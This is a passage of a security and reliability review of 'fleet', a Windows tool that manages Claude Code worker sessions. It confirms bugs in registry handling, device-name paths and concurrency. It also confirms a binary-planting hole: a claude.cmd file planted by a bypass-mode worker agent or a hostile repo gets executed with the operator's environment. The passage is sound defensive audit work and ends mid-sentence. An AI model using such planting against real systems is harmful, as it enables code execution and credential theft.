- *(confidence: high)* I re-read every cited line and could not break the finding. (1) bin/fleet.py:1239 does use buffered open(path,"a"), while append_event (:1037), append_outcome (:9181) and the nonce log (:12215) all go through _atomic_append_bytes (:9165 -> _WindowsPlatform.atomic_append_bytes :392, CreateFileW with FILE_APPEND_DATA only). (2) I reproduced the platform behavior on this machine: 4 threads x 250 buffered open(...,"a") appends, three runs, got 946/1000, 966/1000, 950/1000 with zero exceptions — whole records silently lost, exactly the mode the primitive exists to prevent. (3) Control flow is read correctly: fleet_lock() opens at :4665 and closes after save_registry at :4841; the fork-steer append is at :4846 outside it, and a second `fleet send` entering the lock in that window reaches the raw-status in_flight branch at :4713-4731 and appends to the SAME mailbox/<old_sid>.md (has_fresh_outcome is false because A just restamped last_dispatch_at, and the claim is not expired). The repo itself documents this exact concurrency: _migrate_residual_mailbox's docstring at :9347-9351 ("a concurrent send that lost the raw-status race in _cmd_send_native and queued its message against the OLD sid") and posttooluse_mailbox.py:75-76 ("a transient NTFS lock from a concurrent append"). (4) The hooks claim holds: bin/hooks/posttooluse_mailbox.py:64 and bin/hooks/stop_mailbox.py:69 are _log_hook_error writing state/hook-errors.log; both mailbox paths only os.replace-claim and read. No test or lock covers this — tests/test_steering.py TestAppendMailbox only asserts sequential accumulation. The prior adjudication in docs/reviews/c2-review-adversarial.md:137-142 ("F9 ... attacked and held") is about the pre-pivot legacy code where a concurrent respawn was refused by the turn_pid pre-claim; the native path deliberately permits the second appender, so that adjudication does not carry over. The reviewer did not misread control flow, Windows/CRT semantics, stdlib semantics, or existing coverage.
- *(confidence: high)* The reachability lens does not refute this finding; the repository's own code documents the exact race the finding describes. (1) Mechanism confirmed: bin/fleet.py:1239 is a plain buffered open(path,"a"), while _WindowsPlatform.atomic_append_bytes (bin/fleet.py:400-411) and append_event (bin/fleet.py:1021-1026) both document that this primitive silently drops whole records under concurrent Windows writers, with an in-repo measurement; bin/hooks/stop_outcome.py:12-17 reimplements the atomic primitive for the same reason. The mailbox was not migrated. (2) Concurrency confirmed and NOT guarded upstream: append_mailbox at bin/fleet.py:4846 is deliberately outside the `with fleet_lock():` opened at :4665, while :4731 and :4788 are inside it, so the lock gives zero mutual exclusion between the idle fork-steer writer and a concurrent queue writer targeting the same mailbox/<old_sid>.md. The comment at :4653-4660 states plainly that "send is not claim-gated, so two forked interface bodies steering the same supervisor are indistinguishable at the verb" — concurrent sends are an accepted operational reality, not a hypothetical. (3) The scenario is the repo's own: _migrate_residual_mailbox's docstring (bin/fleet.py:9346-9350) exists specifically because "a concurrent send that lost the raw-status race in _cmd_send_native ... queued its message against the OLD sid, per FIX-2b" — i.e. the maintainers already assert that a second process appends to mailbox/<old_sid>.md during exactly this window. (4) The interleaving reconstructs mechanically: A pre-claims under the lock (status=working, session_id still old_sid, last_dispatch_at restamped at :4839), releases, and appends unlocked at :4846; B acquires the freed lock, reads raw status "working" with raw_sid == old_sid, and because has_fresh_outcome is anchored on A's freshly restamped last_dispatch_at (:4724) the prior outcome does not vouch, so in_flight is True and B appends at :4731 to the same file. Both are mainline branches of `fleet send`, not dead code, and no validation/normalization upstream prevents the input. (5) The docstring's stated justification is independently false: posttooluse_mailbox.py and stop_mailbox.py only os.replace-claim and read the mailbox (their _claim at :70-86 and :127-143); their only open(...,"a") targets state/hook-errors.log. No hook ever appends to a mailbox, so "matching the hooks' own append discipline exactly" cites a precedent that does not exist. The only calibration issue is severity, not validity: the overlap window is narrow because B performs strictly more work after acquiring the lock (load_registry, recompute_worker_native, outcome read) than A performs after releasing it, so A usually completes its write first; overlap requires A to be preempted between lock release and WriteFile.

---

### P1-6 — `fleet kill`/`fleet respawn` on a corrupt registry quarantine it lock-free, then report "unknown worker"

- **Severity:** high  |  **Verdict:** CONFIRMED  |  **Dimension:** `registry-corruption`  |  **Category:** silent-failure/data-loss
- **Location:** `bin/fleet.py:6030`

**What is wrong**

`_supervisor_lifecycle_target` (bin/fleet.py:6029-6032):

```python
    try:
        rec = load_registry().get("workers", {}).get(name)
    except RegistryCorruptError:
        return None
```

This is the *exact* class the module documents as a defect 6000 lines later, for `_supervisor_gate`, at bin/fleet.py:12071-12078: *"it called `load_registry()` inside `except RegistryCorruptError`: the catch-and-continue `load_registry`'s docstring forbids, which swallows the exception but NOT the rename. So `fleet send w1 hello` against a corrupt registry quarantined `state/fleet.json` and then refused with a message that never mentioned the registry."* That instance was fixed; this one was not.

It runs for EVERY name, not just supervisor-shaped ones (the `SUPERVISOR_BODY_NAME` short-circuit is at :6027, the `load_registry()` at :6030), and it runs BEFORE the lock: `cmd_kill` calls it at bin/fleet.py:5891 and only takes `with fleet_lock():` at :5903; `cmd_respawn` calls it at :5633 and locks at :5660. So the quarantine rename — a write — happens outside `fleet.lock`.

It also falsifies `cmd_respawn`'s own comment at bin/fleet.py:5657-5659: *"resolve under the lock so a corrupt registry surfaces through load_registry's quarantine and an unknown worker gets the uniform error"* — the corruption can never surface there, because :5633 already converted it to absent.

**Failure scenario**

State: `state/fleet.json` holds live records for `w1` and `w2` and has been corrupted (hand-edit, truncation, disk event). Operator runs `fleet kill w1`.

Measured (probe in an isolated FLEET_HOME, py -3.13):
```
ERROR TEXT: "unknown worker: 'w1'"
registry exists: False
artifacts: ['fleet.json.corrupt.2026-07-27T232926Z']
```
`fleet respawn w1` is identical:
```
ERROR: "unknown worker: 'w1'" FleetCliError
registry exists: False
artifacts: ['fleet.json.corrupt.2026-07-27T233238Z']
```

So: every worker record in the fleet is renamed out of the live registry, by a lock-free write, and the single line of output the operator gets says the worker does not exist — the word "registry" never appears. The natural next action is `fleet spawn` or `fleet status`, which recreates a thin registry (the documented "probe D"), after which `w2` is a live session fleet no longer tracks.

**Fix**

Route the read through `_registry_records_or_none()` (or `_read_registry_readonly()`), exactly as `_supervisor_gate` was fixed at bin/fleet.py:12105, and let `cmd_kill`/`cmd_respawn`'s own lock-held `load_registry()` be the sanctioned quarantine site. Also drop `_supervisor_lifecycle_target` from `ALLOWED` in tests/test_load_registry_callers.py:196 — it sits under the comment `# --- supervisor lifecycle: all inside fleet_lock() ---` (line 184), which is false for it, the same false rationale that file records for `_supervisor_gate`.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* Reachability lens: the path is live and I reproduced it twice. bin/fleet.py:6027 short-circuits only the literal name `supervisor`, so an ordinary worker name reaches the `load_registry()` at :6030. Nothing upstream guards it: cmd_kill's only prior step is `_supervisor_gate` (:5886), which returns early with no claim held and, post fix-wave-2, reads via `_registry_records_or_none()` (:12105) so it neither quarantines nor consumes the corruption. `_resolve_worker_target` (:5902) and the lock (:5903) both come AFTER. Same shape in cmd_respawn (:5633 call, :5660 lock). load_registry renames at :750/:756 before raising, so the `except RegistryCorruptError: return None` swallows the exception but not the write. Measured in an isolated FLEET_HOME on py -3.13 with a corrupt state/fleet.json holding live records: `fleet kill w1` -> FleetCliError "unknown worker: 'w1'", registry gone, artifact fleet.json.corrupt.<ts>; `fleet respawn w1` identical. Attribution probe (stubbing ONLY _supervisor_lifecycle_target to return None) changes the outcome to RegistryCorruptError naming the quarantine path, from the lock-held load at :5904 — which isolates the defect to :6030 and confirms both the lock-free-write and the destroyed-diagnosis claims. The allowlist entry at tests/test_load_registry_callers.py:195 does sit under the false "all inside fleet_lock()" heading (line 184). I found no dead-code, validation, or upstream-guard basis to refute.
- *(confidence: high)* Re-read the cited lines and reproduced the behavior; the reviewer's control-flow reading is accurate on every load-bearing point. bin/fleet.py:6027 short-circuits only the literal name `supervisor`, so the `load_registry()` at :6030 runs for every ordinary worker name, and `except RegistryCorruptError: return None` at :6031-6032 swallows the exception but not the quarantine rename (load_registry :750/:756; its own docstring at :736 says callers must abort, not catch-and-continue). Ordering confirmed: cmd_kill calls it at :5891 and only locks at :5903; cmd_respawn calls it at :5633 and locks at :5660, so the rename is a write performed outside fleet.lock. main() (:15036-15081) is a flat dispatch with no earlier registry read, so this is genuinely the first quarantine site. Measured in an isolated FLEET_HOME with a truncated state/fleet.json holding w1 and w2: `_supervisor_lifecycle_target('kill','w1')` returned None, the registry file was gone, and `fleet.json.corrupt.<ts>` appeared; full `cmd_kill` raised FleetCliError "unknown worker: 'w1'" with the registry already renamed aside and no mention of corruption. cmd_respawn's comment at :5657-5659 is falsified as claimed — after :5633 the corruption is gone, `_read_registry_readonly()` at :5651 sees an empty registry, and the lock-held load at :5661 takes the missing-file branch. tests/test_load_registry_callers.py:195 does list `_supervisor_lifecycle_target` under the "all inside fleet_lock()" header at :184, which is false for it, and no test exercises kill/respawn against a corrupt registry (test_views_doctrine.py covers views only; kill/respawn are not views). The strongest counter-argument I could construct — that cmd_kill/cmd_respawn are operator-invoked mutating verbs and therefore entitled to quarantine — does not rescue it: the defect is that the quarantine happens lock-free, before the verb's own sanctioned lock-held load, and that the diagnosis is swallowed so the operator is told the worker does not exist while every other record (w2) has just been renamed out of the live registry.

---

### P1-7 — `fleet doctor --repair` reports "has been quarantined" on the branch that never attempts a rename

- **Severity:** high  |  **Verdict:** CONFIRMED  |  **Dimension:** `registry-corruption`  |  **Category:** false-report
- **Location:** `bin/fleet.py:9039`

**What is wrong**

`_doctor_check_registry` keys the message on the `--repair` FLAG, not on whether a quarantine actually happened (bin/fleet.py:9038-9040):

```python
    if repaired:
        return ("registry", False,
                f"registry was corrupt and has been quarantined -- {error}")
```

`repaired` is `repair = bool(getattr(args, "repair", False))` (bin/fleet.py:9077) — the flag the operator typed.

But `load_registry` has a branch that raises WITHOUT quarantining (bin/fleet.py:752-753):
```python
    except OSError:
        raise RegistryCorruptError(f"registry unreadable: {path}")
```
No `_quarantine_registry` call, no rename, no artifact. `cmd_doctor` catches it at :9088 and hands it to the row above, which announces the quarantine anyway.

**Failure scenario**

State: `state/fleet.json` exists but `open()` fails with an OSError — an ACL denying read, a file another process holds with an exclusive handle, or the path occupied by a directory. Operator runs `fleet doctor --repair`.

Measured (probe, `open()` on the registry raising `PermissionError(13)`):
```
ROW: [FAIL] registry: registry was corrupt and has been quarantined -- registry unreadable: ...\state\fleet.json
registry still present: True
artifacts: []
```

No rename was attempted, no artifact exists, `state/fleet.json` is untouched — and the sole repair verb told the operator it repaired. The operator stops here; every subsequent verb keeps refusing, and no artifact exists so none of the artifact-aware refusals (`_sweep_husks`, the §9 arm, `_identity_abstention_note`) can explain why.

**Fix**

Have `_quarantine_registry` report whether the rename succeeded (return `None`/raise on failure instead of `except OSError: pass`), have `load_registry` carry that fact on the exception, and make `_doctor_check_registry` key its wording on the observed outcome rather than on `repaired`. The `registry unreadable` branch must say "could not be quarantined: <reason>".

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* Reproduced live, not argued. In an isolated FLEET_HOME with state/fleet.json created as a directory (Path.exists() True, open() raises PermissionError -> OSError), `cmd_doctor(Namespace(repair=True))` printed `[FAIL] registry: registry was corrupt and has been quarantined -- registry unreadable: <path>` with the path untouched and zero fleet.json.corrupt.* artifacts. Line numbers verified exactly as filed: bin/fleet.py:9038 `if repaired:`, :9040 the "has been quarantined" f-string, :9077 `repair = bool(getattr(args, "repair", False))`, :9088 the catch, and `--repair` is a real argparse flag at bin/fleet.py:14861. No upstream guard: load_registry (bin/fleet.py:745-753) branches only on path.exists(), and nothing validates readability before open(). The branch is not dead — load_registry is the sole quarantine site and cmd_doctor --repair is its only remaining caller for this purpose. The finding is in fact narrower than the real defect: _quarantine_registry (bin/fleet.py:628-640) is explicitly best-effort and swallows the rename failure (`except OSError: pass`), returning the destination path regardless, so load_registry:750 emits "corrupt registry quarantined to <path>" on the JSON-decode branch too when the rename fails. That variant is more reachable than the filed one, because _replace_with_retry's docstring (bin/fleet.py:813-815) records win32 sharing violations on this exact file as observed live ("os.replace onto a path another process has open fails with WinError 5/32 -- observed live crashing cmd_kill's own save_registry"); the same AV/backup exclusive handle makes path.rename fail identically. The only thing I can push back on is severity framing: the row is [FAIL], cmd_doctor exits nonzero, and the true cause ("registry unreadable: <path>") appears in the same sentence, so the claim that "the operator stops here" as if repaired overstates it — it is a false clause inside an accurate failure report, not a false clear.
- *(confidence: high)* I tried to refute this and could not. The control flow reads exactly as the reviewer describes and I reproduced the wrong output end-to-end.  CONTROL FLOW, re-read myself: - bin/fleet.py:746-753 — `load_registry` has three exits. The `json.JSONDecodeError/UnicodeDecodeError` arm (:749-751) and the shape-validation arm (:754-757) both call `_quarantine_registry(path)`. The `except OSError:` arm (:752-753) raises `RegistryCorruptError(f"registry unreadable: {path}")` with NO quarantine call — no rename, no artifact, no `registry_corrupt` event. - bin/fleet.py:9077 — `repair = bool(getattr(args, "repair", False))`; the flag, not an outcome. - bin/fleet.py:9088-9095 — `cmd_doctor` catches every `RegistryCorruptError` identically into `registry_error = str(exc)`, losing the distinction. - bin/fleet.py:9099 — `functools.partial(_doctor_check_registry, registry_error, repair)`; :9038-9040 keys "registry was corrupt and has been quarantined" purely on `repaired`.  REACHABILITY, checked rather than assumed: - `main` (bin/fleet.py:15036-15089) does no registry read before dispatching `doctor`, so the CLI path reaches `cmd_doctor` directly; nothing pre-empts it. - `PermissionError`/`IsADirectoryError` are `OSError` subclasses, so the arm fires on a read-denied ACL, an exclusive handle, or the path occupied by a directory. This is not speculative on this platform: `_replace_with_retry` (bin/fleet.py:812-819) exists precisely because Windows sharing violations on `state/fleet.json` were "observed live crashing `cmd_kill`'s own `save_registry`".  MEASURED (my own probe, both an OSError-by-directory case and an `open()`-raises-PermissionError(13) case, against a control invalid-JSON case that does quarantine correctly): rc=1, row reads "[FAIL] registry: registry was corrupt and has been quarantined -- registry unreadable: ...", `state/fleet.json` still present with its bytes intact, zero `fleet.json.corrupt.*` artifacts, and `state/events.jsonl` never created. The control case renames, creates the artifact and writes the event — so the divergence is real, not a probe artifact.  EXISTING COVERAGE: none. `tests/test_view_quarantine.py::TestRepairIsTheOnlyQuarantine` (:197-244) only ever seeds `CORRUPT = "{ this is not json"` via `_corrupt()` (:74-76), i.e. the JSON-decode arm. `test_repair_says_it_quarantined_rather_than_telling_you_to` (:209-216) asserts `"quarantined" in out` on that arm only. No test drives the `OSError` arm, so nothing pins the message to an observed outcome.  MAKES IT WORSE, not better: the report-only row (:9041-9044) tells the operator "Rerun as `fleet doctor --repair` to quarantine it" for this same unreadable condition — so the default row directs the operator at a flag that then falsely reports success. A closed loop of wrong advice.

---

### P1-8 — validate_name accepts Windows reserved device names (con/nul/aux/com1…): task file, journal and outcomes silently vanish

- **Severity:** high  |  **Verdict:** CONFIRMED  |  **Dimension:** `subprocess-security`  |  **Category:** data-loss
- **Location:** `bin/fleet.py:606`

**What is wrong**

`validate_name` (bin/fleet.py:587) gates every spawnable name on one regex:

    NAME_RE = re.compile(r"^[a-z0-9-]+$")          # :564
    if not name or not NAME_RE.match(name):        # :606
        raise ValueError(...)

The only extra refusals are uuid shape (`_SID_SHAPE_RE`) and `RESERVED_NAMES = {"supervisor"}`. `con`, `nul`, `aux`, `prn`, `com1`..`com9`, `lpt1`..`lpt9` are all pure `[a-z0-9]+` and pass. Every on-disk artifact for a worker is built by direct name interpolation:

    def task_file_path(name):    return tasks_dir()    / f"{name_fs_stem(name)}.md"   # :151
    def journal_file_path(name): return journals_dir() / f"{name_fs_stem(name)}.md"   # :164
    def outcome_path(key):       return outcomes_dir() / f"{name_fs_stem(key)}.jsonl" # :141

`name_fs_stem` only maps `|`->`~`; it does nothing about device names. Win32 resolves reserved device names in ANY directory and with ANY extension, so `state/tasks/nul.md` IS the NUL device. Measured on this machine (py 3.13, Windows 10):

    p = TEMP/'whichtest/tasks/nul.md'
    p.write_text('SECRET TASK TEXT')   -> no exception
    p.exists()                         -> True
    p.read_text()                      -> ''
    os.listdir(dir)                    -> []          # nothing was ever written

So `dispatch_bg`'s guarded write (bin/fleet.py:9686 `task_path.write_text(prompt_body, ...)`, wrapped in `except OSError -> NativeDispatchError`) SUCCEEDS and the launch proceeds. A second measurement: a `read_text()` on `<dir>/con.md` blocked until my 120s tool timeout (CON opened for read waits on console input), which is exactly what `compose_prompt`'s respawn arm does — `journal_path.exists()` then `journal_path.read_text(...)` (bin/fleet.py:1297-1301), reached from `_cmd_respawn_native` (:5512) and `_resume_one_limited` (:5000) via `journal_file_path(name)`.

**Failure scenario**

Operator (or the manager agent) runs `fleet spawn nul --dir C:\proj --task "@big-task.md"` on Windows. validate_name passes. dispatch_bg writes the composed preamble+task to `state/tasks/nul.md` — the NUL device — and the write returns success, so no rollback fires. The worker is dispatched with the tiny prompt `Read C:/proga/claude-fleet/state/tasks/nul.md and follow it exactly.` It reads an EMPTY file: no preamble, no journal mandate, no task at all. Under the default campaign mode (`--dangerously-skip-permissions`) a fully unconstrained session is now running in C:\proj with zero instructions. Everything else for that worker is equally void: its journal writes go to `state/journals/nul.md` (discarded, so `fleet respawn nul` carries nothing forward), and the Stop hook's outcome append goes to `state/outcomes/nul.jsonl` (discarded), so `read_outcomes("nul")` is permanently empty — `fleet result nul` never returns anything and `_fast_completion_sid` can never find a completed turn. With `con` instead of `nul` the failure is a hang: `fleet respawn con` blocks forever inside `compose_prompt`'s `journal_path.read_text()` on the console device.

**Fix**

Add a device-name refusal to `validate_name` alongside the existing uuid/RESERVED_NAMES checks (it is the single creation choke point, and `dispatch_bg`'s defence-in-depth name check at :9668 should get the same predicate): refuse when `name.split('.')[0].lower()` is in `{'con','prn','aux','nul','com1'..'com9','lpt1'..'lpt9'}` (and, for completeness, `conin$`/`conout$`). Refusing at mint time keeps the whole class unrepresentable, matching the doctrine already stated for the F6 uuid refusal, rather than patching each of the three path builders.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* I attempted to refute on reachability and failed — the path is fully reachable and I reproduced it end-to-end with the real fleet module.  REACHABILITY CHECKS, all negative for refutation: - `p_spawn.add_argument("name")` (bin/fleet.py:16044) is a bare positional with no `choices`/`type` restriction. Nothing normalizes or rewrites the name between argv and validate_name. - The single creation choke point `validate_name(args.name, existing=...)` at bin/fleet.py:3856 is the only caller; validate_name (bin/fleet.py:589-616) refuses exactly three things: `not NAME_RE.match`, `_SID_SHAPE_RE`, and `RESERVED_NAMES = {"supervisor"}`. `nul` and `con` are pure `[a-z0-9]+`. - No device-name guard exists anywhere. `grep` over bin/fleet.py for device/nul/lpt1/aux and over tests/*.py returned nothing (the one hit, tests/test_fleet_index.py:511, is an unrelated comment about a source file named nul.py). - `dispatch_bg`'s defence-in-depth name check (bin/fleet.py:9664) uses the identical predicate (`NAME_RE.match(name) or _is_supervisor_shaped(name)`, plus the sid-shape refusal), so it admits `nul`/`con` too. The branch is not dead code.  EMPIRICAL CONFIRMATION (py 3.13, Windows 10, real module with FLEET_HOME set to a temp dir):   validate_name('nul') -> no raise   validate_name('con') -> no raise   task_file_path('nul') -> ...\state\tasks\nul.md   write_text('PREAMBLE + TASK') -> OK, exists()=True, read back = '' , os.listdir(tasks)=[] So `task_path.write_text(prompt_body, encoding="utf-8")` at bin/fleet.py:9685 succeeds, the `except OSError -> NativeDispatchError` at :9686 never fires, no rollback runs, and the launch proceeds with `tiny_prompt = "Read .../nul.md and follow it exactly."` against an empty read. Under the default campaign mode that is an unconstrained --dangerously-skip-permissions session with zero instructions.  OUTCOME-LOSS HALF CONFIRMED AT THE HOOK: bin/hooks/stop_outcome.py:233 does `key = _resolve_name(home, sid) or sid` — it PREFERS the registry name, and `_resolve_name` returns "nul" (it passes `_valid_token`), so the sid-keyed fallback in `read_outcomes` (bin/fleet.py:9187 `if sid and sid != name: paths.append(outcome_path(sid))`) is never populated. `_atomic_append_bytes(out_dir / "nul.jsonl", ...)` goes to the NUL device and the whole call is inside `except Exception` ("hooks never crash the turn"), so it is silent either way. `read_outcomes("nul")` is permanently [].  CON HANG CONFIRMED: `Path(fresh_tmpdir)/'con.md'` `.exists()` returns True with NO write at all, so `compose_prompt`'s guard `if journal_path.exists():` (bin/fleet.py:1297) is satisfied unconditionally once journals_dir() exists (dispatch_bg mkdirs it at :9683). The following `journal_path.read_text(encoding="utf-8", errors="replace")` (bin/fleet.py:1299) blocked past a 12s timeout (exit=124) even with stdin redirected from /dev/null. Reached from `_cmd_respawn_native` and `_resume_one_limited` via `journal_file_path(name)`.  The finding is real, reachable, and unguarded. My only correction is to its scope (see the correction field).
- *(confidence: high)* I tried to refute and could not. Control flow reads exactly as claimed: validate_name (bin/fleet.py:589) gates on NAME_RE `^[a-z0-9-]+$` (:566) plus only _SID_SHAPE_RE (:610) and RESERVED_NAMES={"supervisor"} (:586,:614) — I executed it and `nul`, `con`, `aux`, `prn`, `com1`, `lpt1` are all ACCEPTED. name_fs_stem (:124-140) is `name.replace("|","~")` and nothing else. The single caller is the spawn path at :3856, and the raw name reaches dispatch_bg, whose task write at :9686 is guarded only by `except OSError` (:9687). compose_prompt :1297-1303 does exists() then read_text() with only an OSError guard.  Platform behavior verified by measurement on this machine (py 3.13, Win10 19045): writing `<tmp>/tasks/nul.md` succeeds, exists() is True, read_text() returns '', and os.listdir(dir) is [] — silent void, no OSError, so the DOA rollback at :3919+ never fires and the worker is dispatched with a tiny prompt pointing at an empty file. Reading `<tmp>/j/con.md` under `timeout 25 ... < /dev/null` exited 124 (hung), confirming the compose_prompt respawn hang — and that hang is in the manager process, not the worker.  No existing test covers this. The only near-hits are tests/test_destructive_guard.py:15,490 (about /dev/null being a tty, unrelated) and tests/test_fleet_index.py:511, which is a comment about `nul.py` yielding FileExistsError from os.replace and monkeypatches the error rather than exercising a real device name.  The finding is over-broad in one respect, which I corrected rather than treated as a refutation: aux/prn/com1/lpt1 all raised FileNotFoundError [Errno 2] on write, which IS an OSError, so dispatch_bg converts it to NativeDispatchError and the spawn rolls back cleanly — those fail loudly and are not defects. conin$/conout$ already fail NAME_RE because `$` is outside the charset. The real hazard set is exactly {nul, con}.

---

### P1-9 — resolve_claude_executable uses shutil.which, which prefers `claude.cmd` in the CURRENT DIRECTORY on Windows

- **Severity:** high  |  **Verdict:** CONFIRMED  |  **Dimension:** `subprocess-security`  |  **Category:** security
- **Location:** `bin/fleet.py:1342`

**What is wrong**

def resolve_claude_executable(which=shutil.which) -> str:   # :1338
        exe = which("claude")                                    # :1342

The resolved `exe` is then executed with the parent's full environment and bypass flags:

    argv = [exe, "--bg", ...] + mode_flags(mode)                 # :9694, :9718
    proc = run(argv, cwd=str(cwd), env=_worker_env(name), ...)   # :9748

`shutil.which` on win32 prepends `os.curdir` to the search path. Measured on this machine with a planted `claude.cmd` in the cwd:

    # py -3.10 (the DECLARED FLOOR, fleet.MIN_PYTHON_VERSION)
    shutil.which('claude') -> '.\\claude.CMD'      # even though NoDefaultCurrentDirectoryInExePath=1 was set

    # py -3.13, with the env guard removed (its default state on Windows)
    shutil.which('claude') -> '.\\claude.CMD'

On 3.13 the curdir insert is gated on `_win_path_needs_curdir` -> `_winapi.NeedCurrentDirectoryForExePath`, which returns True unless `NoDefaultCurrentDirectoryInExePath` is set in the environment; that variable is NOT persisted at User or Machine scope on this box ([Environment]::GetEnvironmentVariable returned empty for both), it is merely inherited from the current shell. On 3.10 the insert is unconditional, so even the OS opt-out does not help — and CLAUDE.md states the code must run on 3.10. `subprocess`/CreateProcessW resolves the relative `.\claude.CMD` against the PARENT process's cwd (cwd= only sets the child's working directory), i.e. against exactly the directory shutil.which found it in, and CreateProcessW does execute .cmd/.bat files. Neither shim changes directory: `bin/fleet.cmd` is `py -3.13 "%~dp0fleet.py" %*` and `bin/fleet` execs run_py.sh — both inherit the invoking shell's cwd. `bin/fleet.cmd` has the same problem one level up: cmd.exe resolves the bare `py` from the current directory first, so a planted `py.cmd` hijacks the whole CLI.

**Failure scenario**

The manager session's cwd is a project directory that a fleet worker has been editing (this is the normal case — the manager runs `fleet spawn`/`fleet send` from the Bash tool in its own project cwd). A worker running with `--dangerously-skip-permissions` in that repo, or a hostile repo the operator cloned and cd'd into, drops a file named `claude.cmd` at the repo root. The next `fleet spawn`, `fleet send`, `fleet respawn`, `fleet kill`, `fleet doctor` (`run([exe, "--version"])` :7903, `run([exe, "agents", "--json"])` :8397) or `_fetch_agents_roster` (:11583) resolves `.\claude.CMD` and executes it — with `_worker_env`'s copy of the operator's full environment (API keys, tokens) and, on the dispatch path, argv already containing `--dangerously-skip-permissions`. On the declared 3.10 floor this happens regardless of NoDefaultCurrentDirectoryInExePath. The attacker gets arbitrary code execution as the operator on a machine whose whole point is to run unattended bypass-mode agents.

**Fix**

Do not let cwd participate in resolution. In `resolve_claude_executable`, pass an explicit search path that excludes the current directory — `which("claude", path=os.environ.get("PATH", ""))` still hits the curdir insert on 3.10, so resolve against `os.pathsep.join(p for p in os.environ.get("PATH","").split(os.pathsep) if p)` with an explicit `path=` AND reject a result whose `os.path.dirname` is empty/`.`/equal to `os.getcwd()`; better still, honor an explicit `FLEET_CLAUDE` absolute-path override first. Give `bin/fleet.cmd` the same treatment (invoke a resolved absolute python, not bare `py`).

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* I tried to refute this and could not kill the core defect — but the reviewer got the exploit mechanism materially wrong, and it is the wrong half that carries their headline severity claim.  WHAT I CONFIRMED (measured on this machine, scratch dir with a planted claude.cmd, since deleted):  1. `bin/fleet.py:1344` `exe = which("claude")` with the default `which=shutil.which` does return a cwd-relative path.    - py 3.10.1: `shutil.which('claude') -> '.\\claude.CMD'` even with `NoDefaultCurrentDirectoryInExePath=1` present (3.10/3.11 insert `os.curdir` unconditionally; the `_win_path_needs_curdir` gate only landed in 3.12).    - py 3.13.12 with the var unset: `NeedCurrentDirectoryForExePath('claude') -> True`, `shutil.which('claude') -> '.\\claude.CMD'`.    - With the var set (its state inside this Claude Code shell): `-> 'C:\\Users\\Techn\\.local\\bin\\claude.EXE'`. PowerShell confirms `User=[]`, `Machine=[]`, `Process=[1]` — so it is inherited from this shell only, and an operator's own cmd.exe/PowerShell gets no protection even on 3.13.    - `bin/hooks/run_py.sh` falls back through `python3.11`/`python3.10`, both unconditionally vulnerable, and honors an arbitrary `$FLEET_PYTHON`. `fleet.MIN_PYTHON_VERSION = (3, 10)` (bin/fleet.py:67). 2. CreateProcessW does execute the planted `.cmd` (rc 0, script output captured). 3. No `FLEET_CLAUDE`-style absolute-path override exists; grep for `FLEET_CLAUDE|CLAUDE_EXE|claude_exe` in bin/fleet.py returns nothing. No test covers this: `tests/test_cli.py:302-311` only injects a fake `which` returning `"C:/fake/claude.cmd"` or `None`, so it can never observe curdir behavior.  WHAT I REFUTED — the reviewer's stated mechanism is empirically false:  > "`subprocess`/CreateProcessW resolves the relative `.\claude.CMD` against the PARENT process's cwd (cwd= only sets the child's working directory), i.e. against exactly the directory shutil.which found it in"  Measured, on both 3.10 and 3.13: parent chdir'd to dirA (containing claude.cmd echoing FROM_DIR_A), `subprocess.run(['.\\claude.CMD'], cwd=dirB)` where dirB has its own claude.cmd → stdout `FROM_DIR_B`. The relative path resolves against the `cwd=` argument, not the parent's cwd.  That breaks the finding's headline scenario exactly where it claimed the most damage. `dispatch_bg` (bin/fleet.py:9750) passes `cwd=str(cwd)` — the worker's `--dir`, not the manager's. Planting `claude.cmd` in the manager's cwd only, then dispatching into a clean directory, gives:      which: '.\\claude.CMD'     rc 1 err "'.\\claude.CMD' is not recognized as an internal or external command"  i.e. a broken `fleet spawn`, not code execution. So "the next `fleet spawn`, `fleet send`, `fleet respawn` … resolves `.\claude.CMD` and executes it … with argv already containing `--dangerously-skip-permissions`" is wrong as written. Those sites are RCE only in the narrower case where the spawn target `--dir` itself contains the plant.  The defect survives on the call sites that pass NO `cwd=`, which the reviewer listed but attributed to the wrong cause: - `_doctor_check_claude_version` bin/fleet.py:7905 `run([exe, "--version"], ...)` - `_doctor_check_claude_agents` bin/fleet.py:8399 `run([exe, "agents", "--json"], ...)` - `_fetch_agents_roster` bin/fleet.py:11585 `run([exe, "agents", "--json", "--all"], ...)` - `_rm_native_session` bin/fleet.py:7247 `run([exe, "rm", r], ...)` (fleet kill / clean) - `_stop_native_session` bin/fleet.py:9297 `run([exe, "stop", r], ...)` (fleet interrupt / kill) These inherit the parent's cwd, so `.\claude.CMD` in the manager's cwd is executed — confirmed: parent cwd dirA, no `cwd=`, `rc 0 out FROM_DIR_A`.  So: real, reachable, unhandled, and arbitrary code execution with the operator's inherited environment — but via `fleet doctor`/`kill`/`clean`/`interrupt`/roster-fetch, not via the bypass-flag dispatch argv the finding leads with. Severity "high" is defensible on the surviving paths; the `--dangerously-skip-permissions` framing is not.
- *(confidence: high)* I tried to kill this on reachability and could not. Every link measured on this box:  1. `shutil.which` really does return a cwd-relative path. In a scratch dir containing a planted `claude.cmd`:    - `py -3.10 -c "shutil.which('claude')"` -> `'.\\claude.CMD'` — and this was with `NoDefaultCurrentDirectoryInExePath=1` already present in the environment, i.e. the OS opt-out does not help on the declared floor (3.10's `_win_path_needs_curdir` gate does not exist; the insert is unconditional).    - `env -u NoDefaultCurrentDirectoryInExePath py -3.13 -c "shutil.which('claude')"` -> `'.\\claude.CMD'`. With the var present, 3.13 returns the real `C:\Users\Techn\.local\bin\claude.EXE`.    The var is NOT persisted: `[Environment]::GetEnvironmentVariable(...,'Machine')` and `'User'` both returned empty. I walked the parent chain (`powershell.exe <- claude.exe <- cmd.exe <- Code.exe <- Code.exe <- explorer.exe`) and tested the two candidate re-adders: `env -u ... cmd //c "set NoDefault"` -> "not defined", `env -u ... node -e ...` -> `false`. So neither cmd.exe nor node re-injects it; its presence today is an inherited accident of this VS Code launch, not a property of the system.  2. Execution really happens. `py -3.13 -c "subprocess.run(['.\\claude.CMD'], capture_output=True)"` from the planted dir with **no `cwd=`** -> `rc 0`, stdout `'PWNED\n'`. CreateProcessW does hand .CMD to cmd.exe and it runs.  3. The no-`cwd=` call sites are the hot ones, not obscure ones:    - `bin/fleet.py:11592` `_fetch_agents_roster` -> 